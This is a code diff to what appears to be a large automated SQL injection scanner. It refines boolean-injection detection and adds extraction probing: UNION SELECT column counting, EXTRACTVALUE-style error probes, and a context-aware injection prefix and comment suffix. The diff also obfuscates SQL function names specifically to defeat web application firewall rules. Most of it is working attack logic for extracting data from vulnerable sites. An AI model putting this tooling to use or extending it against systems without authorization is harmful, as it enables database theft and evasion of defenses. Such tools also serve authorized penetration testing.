@@ -116422,6 +116422,32 @@ class TechniqueCascadeEngine:
                                     and _wdh_p_above_min < len(_wdh_p) - 1
                                     and _wass_dist > _wass_min
                                 )
+                                # FIX-WASS-ALL-HIGH-CONSISTENT: When ALL probes in the 5-probe
+                                # window are above the detection threshold AND consistent (range<0.02)
+                                # AND no readings are below 0.15, AND injection was never previously
+                                # confirmed for this param — the page is consistently producing high
+                                # Wasserstein distances regardless of SQL condition.  This is the
+                                # canonical CDN-reflected-header pattern seen in the log: every probe
+                                # pair with a different X-Forwarded-For value produces dist≈0.67
+                                # because the dynamic backend returns a different page body for each
+                                # distinct header value, not because SQL controls the content.
+                                #
+                                # The existing guards missed this case because:
+                                #   - stable_page_outlier requires _wdh_p_below_stable >= len-1 (fails
+                                #     when there are NO below-stable readings at all)
+                                #   - bimodal_outlier requires at least 1 below-stable reading
+                                #   - noise_range suppression requires dist < _wass_min*0.90 (fails
+                                #     because high-dist consistent window exceeds threshold)
+                                # This guard closes the gap: require ALL readings above threshold,
+                                # NONE below 0.15, to identify uniformly-high-variance page noise.
+                                _wass_all_high_consistent = (
+                                    not _wass_param_confirmed
+                                    and len(_wdh_p) >= 3
+                                    and _wass_noise_range
+                                    and _wdh_p_below_stable == 0
+                                    and _wdh_p_above_min == len(_wdh_p)
+                                    and _wass_dist > _wass_min
+                                )
                                 # _wass_noise_range suppression also gated on no prior confirmation
                                 # BUG-WASS-SUPPRESS-DEADLOCK FIX: The previous suppression
                                 # fired unconditionally on _wass_noise_range=True (3+ consistent
@@ -116461,8 +116487,14 @@ class TechniqueCascadeEngine:
                                     or _wass_stable_page_outlier
                                     or _wass_bimodal_outlier
                                     or _wass_asymmetric_waf
+                                    or _wass_all_high_consistent
                                 )
-                                if _wass_noise_range and not _wass_param_confirmed and _wass_dist < _wass_min * 0.90:
+                                if _wass_all_high_consistent:
+                                    print(f"[*]   [Wasserstein] dist={_wass_dist:.4f} ALL-HIGH-CONSISTENT "
+                                          f"({_wdh_p_above_min}/{len(_wdh_p)} probes above threshold={_wass_min:.2f}, "
+                                          f"range={max(_wdh_p)-min(_wdh_p):.4f} < 0.02, none below 0.15) "
+                                          f"-- uniformly-high page variance, NOT injection", flush=True)
+                                elif _wass_noise_range and not _wass_param_confirmed and _wass_dist < _wass_min * 0.90:
                                     print(f"[*]   [Wasserstein] dist={_wass_dist:.4f} CONSISTENT "
                                           f"(range={max(_wdh_p)-min(_wdh_p):.4f} < 0.02 over "
                                           f"{len(_wdh_p)} probes) -- page noise, NOT injection",
@@ -141828,21 +141860,71 @@ class ScannerV15(ScannerV14):
     }
 
     async def _probe_extraction_vectors(self, engine, method, url, data, data_fmt,
-                                         param, original, tamper_chain, baseline, dbms):
+                                         param, original, tamper_chain, baseline, dbms,
+                                         result=None):
         """Probe which extraction methods work, return ranked list fastestslowest."""
         available = []
         _bl_samps = baseline.get("samples", []) if baseline else []
         _bl_body = (_extract_body_safe(_bl_samps[0]) if (_bl_samps and _bl_samps[0] and hasattr(_bl_samps[0], 'body')) else b"")
-        
+
+        # BUG-MV-NAIVE-CONTEXT FIX (HIGH; _probe_extraction_vectors; all DBMSes;
+        # all techniques; all surfaces):
+        # Previously error and union probes always built payloads as
+        # f"{original}' {sql}-- -" — assuming a string injection context with
+        # single-quote terminator and "-- -" comment. This is wrong when:
+        #   • The confirmed injection is numeric (no quote needed)
+        #   • The terminator is a double-quote, closing-paren, or combination
+        #   • The target uses a different comment style (#, /**/)
+        # Consequence: MultiVector probes fail on numeric-context or
+        # double-quote-context targets, falsely marking error-based and union-based
+        # extraction as unavailable, falling back to 5-10× slower boolean/timing.
+        # Fix: derive injection prefix and comment suffix from result.payload
+        # (the confirmed working detection payload) so the probe uses exactly the
+        # same SQL injection context that detection already proved works.
+        _confirmed_payload = (getattr(result, 'payload', '') or '') if result else ''
+        _inj_pfx = f"{original}'"   # safe default: string injection
+        _inj_sfx = "-- -"           # safe default comment
+        if _confirmed_payload:
+            # Extract the comment terminator used during detection
+            for _cmt_try in ("-- -", "--", "#", "/**/"):
+                if _cmt_try in _confirmed_payload:
+                    _inj_sfx = _cmt_try
+                    break
+            # Extract the injection prefix (everything before first AND/OR/UNION/;)
+            _pay_up = _confirmed_payload.upper()
+            _kw_positions = [
+                _pay_up.find(' AND '),
+                _pay_up.find(' OR '),
+                _pay_up.find(' UNION '),
+                _pay_up.find(';'),
+            ]
+            _first_kw = min(p for p in _kw_positions if p >= 0) if any(p >= 0 for p in _kw_positions) else -1
+            if _first_kw >= 0:
+                _inj_pfx = _confirmed_payload[:_first_kw]
+
         print(f"[*] [MultiVector] Probing extraction methods for {dbms}...", flush=True)
         _pv_rctrl = getattr(self, '_rate_ctrl', None)
-        
+        _mv_req_num = 1
+
         # 1. Error-based probes (fastest  data in error message)
         error_probes = self._ERROR_EXTRACT_PROBES.get(dbms, [])
         for probe_name, template in error_probes:
             try:
                 test_q = template.replace("{q}", "SELECT 'mvtest123'")
-                test_payload = f"{original}' {test_q}-- -"
+                # BUG-MV-NO-OBFUSCATION FIX: Apply _obfuscate_extraction_cond so
+                # function names (EXTRACTVALUE, CONCAT, UPDATEXML, CAST, etc.) are
+                # case-mixed with inline block comments before '(' — defeating WAF
+                # rules that pattern-match on fixed-case SQL function literals.
+                # Without this, every MultiVector error probe exposes EXTRACTVALUE(
+                # in plain form; strict WAFs block the first probe and all subsequent
+                # probes, making error-based extraction appear unavailable even when
+                # the injection is real and the target is vulnerable.
+                try:
+                    test_q = _obfuscate_extraction_cond(test_q, _mv_req_num)
+                    _mv_req_num += 1
+                except Exception:
+                    pass
+                test_payload = f"{_inj_pfx} {test_q}{_inj_sfx}"
                 fp = await asyncio.wait_for(
                     _send_injected(engine, method, url, data, data_fmt,
                                    param, test_payload, tamper_chain,
@@ -141864,7 +141946,7 @@ class ScannerV15(ScannerV14):
             # Quick column count: try 1-15 columns
             for ncols in (1, 3, 5, 8, 10, 15):
                 nulls = ",".join(["NULL"] * ncols)
-                union_payload = f"{original}' UNION SELECT {nulls}-- -"
+                union_payload = f"{_inj_pfx} UNION SELECT {nulls}{_inj_sfx}"
                 fp = await asyncio.wait_for(
                     _send_injected(engine, method, url, data, data_fmt,
                                    param, union_payload, tamper_chain,
@@ -142048,7 +142130,8 @@ class ScannerV15(ScannerV14):
                 _mv_vectors = await asyncio.wait_for(
                     self._probe_extraction_vectors(
                         engine, scan_meth, scan_url, data, data_fmt,
-                        param, original, tamper_chain, baseline, dbms),
+                        param, original, tamper_chain, baseline, dbms,
+                        result=result),
                     timeout=60)
             except (asyncio.TimeoutError, TimeoutError):
                 print("[!] [MultiVector] Probe timed out  using default extraction", flush=True)
@@ -165736,7 +165819,22 @@ class WassersteinResponseOracle:
             candidate = q3 + 1.5 * iqr
             if candidate > self.threshold:
                 self.threshold = candidate
-        return (d > self.threshold), round(d, 6)
+        is_diff = d > self.threshold
+        # FIX-WASS-BASELINE-DISCRIMINATION: when a baseline body is provided, use it to
+        # distinguish SQL-controlled content differences from inherent page variance.
+        # CDN cache misses produce dist(any_two_requests) ≈ 0.67 for ALL pairs regardless
+        # of SQL; genuine boolean injection produces dist(false, baseline) ≈ 0 because the
+        # false condition returns the same clean page as the baseline.
+        # Guard: suppress when dist(false_body, baseline_body) > 80% of dist(true, false).
+        # This correctly handles:
+        #   - Page noise (CDN miss): d_false_base ≈ 0.67 ≈ d → suppress
+        #   - Genuine injection: d_false_base ≈ 0.02 << d → don't suppress
+        #   - WAF bypass (false=blocked, baseline=blocked): d_false_base ≈ 0.0 → don't suppress
+        if is_diff and baseline_body:
+            d_false_base = self.wasserstein1(false_body, baseline_body)
+            if d_false_base > d * 0.8:
+                is_diff = False
+        return is_diff, round(d, 6)
 
 
 # Module-level singletons  instantiated here so WassersteinResponseOracle is in scope.
